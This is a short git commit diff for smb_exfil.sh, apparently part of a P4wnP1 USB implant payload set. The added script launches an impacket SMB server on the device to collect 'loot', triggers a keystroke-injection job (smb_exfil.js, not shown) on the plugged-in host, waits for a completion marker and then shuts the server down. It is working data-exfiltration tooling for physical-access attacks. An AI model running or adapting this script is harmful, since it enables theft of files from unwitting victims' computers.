ec5c7e94baceb9d9cd90b90928a0ec737bcfd8d5
endbehavi0r <48213738+endbehavi0r@users.noreply.github.com>
2021-03-13 10:56:08 +0530

    Update smb_exfil.sh

--- smb_exfil/smb_exfil.sh
+++ smb_exfil/smb_exfil.sh
@@ -1,3 +1,15 @@
-P4wnP1_cli led -b 5 > /dev/null
-P4wnP1_cli hid run smb_exfil.js > /dev/null
-P4wnP1_cli led -b 255 > /dev/null
+#!/bin/bash
+# Place this file in the scripts directory
+
+rm "/opt/loot/done" -f
+# clean redundant file if any
+P4wnP1_cli led -b 1
+python3 /opt/impacket/examples/smbserver.py -comment "Documents" -smb2support e /opt/loot &
+sleep 2
+P4wnP1_cli led -b 25
+P4wnP1_cli hid job smb_exfil.js
+while [ ! -f "/opt/loot/done" ];do sleep 1;done
+# wait until the "done" file is created
+kill `ps ax | grep impacket | grep -v grep | grep -Po "\s+\d+\s"`
+rm "/opt/loot/done" -f
+P4wnP1_cli led -b 0
